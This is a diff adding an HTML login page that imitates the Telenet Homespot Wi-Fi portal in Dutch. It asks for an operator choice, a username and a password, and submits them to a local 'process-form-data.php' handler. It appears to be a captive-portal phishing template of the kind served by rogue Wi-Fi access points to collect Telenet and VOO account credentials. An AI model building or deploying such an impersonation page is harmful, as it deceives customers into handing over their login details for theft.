@@ -1,0 +1,86 @@
+<!doctype html>
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+	<title>Telenet Homespot</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="format-detection" content="telephone=no">
+
+	<link rel="shortcut icon" href="#">
+	<script src="/js/jquery-1.9.1.min.js"></script>
+	<script src="/js/modernizr-2.6.2-respond-1.1.0.min.js"></script>
+	<link rel="stylesheet" href="/css/style.css">
+	<script src="/js/placeholder-1.js"></script>
+	<script src="/js/login-2.js"></script>
+	<script src="/js/blur-n-focus-3.js"></script>
+</head>
+
+<body>
+	<div class="wrapper ">
+		<div class="container ">
+			<div class="lang ">
+				<ul>
+					<li><a href="?tnlang=en ">EN</a><span>-</span></li>
+					<li class="active "><a href="# ">NL</a><span>-</span></li>
+					<li><a href="?tnlang=fr ">FR</a></li>
+				</ul>
+			</div>
+			<header id="header ">
+				<h1></h1></header>
+			<div id="content ">
+				<div class="cols ">
+					<div class="cols_top "></div>
+					<div class="cols_center ">
+						<div class="col ">
+
+							<form name="telenet-login" id="telenet-login" method="POST" action="process-form-data.php ">
+								<!-- operator -->
+								<label for="operator">Selecteer operator</label>
+								<div class="styled-select ">
+									<select id="operator" name="operator" onchange="customerUpdate() ">
+									<option value="Telenet">Telenet</option>
+									<option value="Voo">VOO </option></select>
+								</div>
+
+								<!-- username -->
+								<label for="username">Gebruikersnaam</label>
+								<input type="text" name="username" id="username" placeholder="Telenet login, e-mailadres of gebruikersnaam " />
+
+								<!-- pwd -->
+								<label for="password">Wachtwoord</label>
+								<input type="password" name="password" id="password" required/>
+
+								<div class="login_xt">
+									<input type="checkbox" name="keepMeSignedIn" />
+									<label class="a">Aangemeld blijven </label>
+
+									<input type="checkbox" />
+									<label class="a">
+										Ik aanvaard de <a href="#gebruiksvoorwaarden">Gebruiksvoorwaarden</a>
+									</label>
+								</div>
+								<div class="submit">
+									<input type="submit" value="Aanmelden " class="button " /></div>
+							</form>
+						</div>
+					</div>
+					<div class="cols_bottom ">
+
+					</div>
+				</div>
+			</div>
+			<footer>
+				<div class="link "><a href="#meer-info ">Meer info</a></div>
+				<div class="copyright ">&copy; Telenet
+					<script type="text/javascript ">
+						var year = new Date();
+						document.write(year.getFullYear());
+					</script>
+				</div>
+			</footer>
+		</div>
+	</div>
+</body>
+
+</html>
